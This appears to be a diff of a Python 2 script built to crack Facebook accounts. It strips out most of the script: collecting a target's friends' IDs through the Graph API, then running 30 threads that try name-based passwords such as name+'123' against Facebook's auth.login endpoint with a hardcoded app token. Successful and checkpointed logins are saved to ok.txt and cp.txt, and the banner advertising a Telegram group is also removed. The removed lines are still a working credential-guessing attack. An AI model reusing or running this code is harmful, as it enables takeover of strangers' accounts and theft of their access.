@@ -259,106 +259,10 @@ def b_menu():
     b_menu_select()
 
 
-def b_menu_select():
-    select = raw_input('\x1b[0;91m> \x1b[0;94m')
-    id = []
-    oks = []
-    cps = []
-    if select == '1':
-        os.system('clear')
-        print logo
-        idt = raw_input('\x1b[0;91mEnter iD Public > \x1b[0;94m')
-        try:
-            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
-            q = json.loads(r.text)
-            print '\x1b[0;91mNama > \x1b[0;94m' + q['name']
-        except (KeyError, IOError):
-            os.system('echo -e "\nID Not Found /Check ID  Public\n" | lolcat')
-            raw_input('\x1b[0;91mPress Enter To back')
-            b_menu()
 
-        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
-        z = json.loads(r.text)
-        for i in z['data']:
-            uid = i['id']
-            na = i['name']
-            nm = na.rsplit(' ')[0]
-            id.append(uid + '|' + nm)
 
-    print '\x1b[0;91m Total IDs > \x1b[0;94m' + str(len(id))
-    time.sleep(0.5)
-    print ''
-    os.system('echo -e "\nEnter 5  pass  example 100200 500600 786786\n" | lolcat')
-    print ''
-    pass5 = raw_input('\x1b[0;91mpass 1 >\x1b[0;94m ')
-    pass6 = raw_input('\x1b[0;91mpass 2 >\x1b[0;94m ')
-    pass7 = raw_input('\x1b[0;91mpass 3 >\x1b[0;94m ')
-    pass8 = raw_input('\x1b[0;91mpass 4 >\x1b[0;94m ')
-    pass9 = raw_input('\x1b[0;91mpass 5 >\x1b[0;94m ')
-    print ''
-    os.system('echo -e "Created by Mohammad Sultani Fast Script\n\n\t   \n" | lolcat')
-    time.sleep(5)
-
-    def main(arg):
-        w = random.choice(['\x1b[0;96m', '\x1b[0;93m', '\x1b[0;95m', '\x1b[0;91m', '\x1b[0;92m', '\x1b[0;94m'])
-        sys.stdout.write(('\r{}').format(datetime.now().strftime('\r' + w + '[ %H<>%M<>%S ]')))
-        sys.stdout.flush()
-        user = arg
-        uid, name = user.split('|')
-        try:
-            pass1 = name + '123'
-            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
-            d = json.loads(q)
-            if 'www.facebook.com' in d['error_msg']:
-                print '\r\x1b[0;93mMking1-CP ' + uid + ' - ' + pass1
-                cp = open('cp.txt', 'a')
-                cp.write(uid + ' - ' + pass1 + '\n')
-                cp.close()
-                cps.append(uid)
-            elif 'access_token' in d:
-                print '\r\x1b[0;92mMking1-OK ' + uid + ' - ' + pass1
-                ok = open('ok.txt', 'a')
-                ok.write(uid + ' - ' + pass1 + '\n')
-                ok.close()
-                oks.append(uid)
-            else:
-                pass2 = last_name + '123'
-                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
-                d = json.loads(q)
-                if 'www.facebook.com' in d['error_msg']:
-                    print '\r\x1b[0;93mMking1-CP ' + uid + ' - ' + pass2
-                    cp = open('cp.txt', 'a')
-                    cp.write(uid + ' - ' + pass2 + '\n')
-                    cp.close()
-                    cps.append(uid)
-                elif 'access_token' in d:
-                    print '\r\x1b[0;92mMking1-OK ' + uid + ' - ' + pass2
-                    ok = open('ok.txt', 'a')
-                    ok.write(uid + ' - ' + pass2 + '\n')
-                    ok.close()
-                    oks.append(uid)
-                else:
-                    pass3 = name + '12345'
-                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
-                    d = json.loads(q)
-                    if 'www.facebook.com' in d['error_msg']:
-                        print '\r\x1b[0;93mMking1-CP ' + uid + ' - ' + pass3
-                        cp = open('cp.txt', 'a')
-                        cp.write(uid + ' - ' + pass3 + '\n')
-                        cp.close()
-                        cps.append(uid)
-                    elif 'access_token' in d:
-                        print '\r\x1b[0;92mMking1-OK ' + uid + ' - ' + pass3
-                        ok = open('ok.txt', 'a')
-                        ok.write(uid + ' - ' + pass3 + '\n')
-                        ok.close()
-                        oks.append(uid)
-                    else:
-                        pass4 = name + '123456'
-                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
-                        d = json.loads(q)
-                        if 'www.facebook.com' in d['error_msg']:
-                            print '\r\x1b[0;93mMking1-CP ' + uid + ' - ' + pass4
+    
+            
                             cp = open('cp.txt', 'a')
                             cp.write(uid + ' - ' + pass4 + '\n')
                             cp.close()
@@ -449,26 +353,3 @@ def b_menu_select():
                                         oks.append(uid)
         except:
             pass
-
-    p = ThreadPool(30)
-    p.map(main, id)
-    print ' '
-    os.system('echo -e "Saved\n\nTOTAL Mking1-OK & Mking1-CP\n" | lolcat')
-    print '\x1b[0;92mMking1-OK > ' + str(len(oks))
-    print '\x1b[0;93mMking1-CP > ' + str(len(cps))
-
-
-if __name__ == '__main__':
-    os.system('clear')
-    print 'Created by mohammad Sultani '
-    time.sleep(2)
-    print ' '
-    print 'plese join to telegram group and send id  '
-    time.sleep(2)
-    print ' '
-    print 'Thise Script is Free  I Love You  '
-    time.sleep(2)
-    print ' '
-    os.system('xdg-open https://t.me/Mking_script')
-    time.sleep(10)
-    ip()
